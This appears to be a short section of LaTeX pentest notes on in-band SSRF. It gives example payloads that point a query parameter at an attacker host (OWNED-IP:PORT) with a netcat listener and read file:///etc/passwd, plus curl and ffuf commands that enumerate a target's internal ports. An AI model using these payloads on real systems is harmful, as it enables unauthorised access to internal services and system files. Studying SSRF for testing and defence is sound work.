
\section{In-band SSRF}

\begin{verbatim}
?q=index.html
\end{verbatim}

Try with a netcat listening a basic payload

\begin{verbatim}
?q=http://OWNED-IP:PORT
\end{verbatim}

it might be possible that the \verb+User-Agent+ header expose the library
behing like
\href{https://docs.python.org/3.8/library/urllib.html}{Python-urllib}. In such
a case it is possible to identify the schemas supported (\verb+file+,
\verb+http+,\ldots)

\subsection{File disclosure}
\begin{verbatim}
?q=file:///etc/passwd
\end{verbatim}

\subsection{port enumeration}

\begin{verbatim}
curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"
\end{verbatim}

according to the feedback

\begin{verbatim}
ffuf -w ports.txt:PORT -u "http://TARGET_IP/load?q=http://127.0.0.1:PORT" -fs 30
\end{verbatim}

for each port discovered it is worth checking what it is hiding.

\begin{verbatim}
curl -i -s "http://TARGET_IP/load?q=http://127.0.0.1:5000"
\end{verbatim}
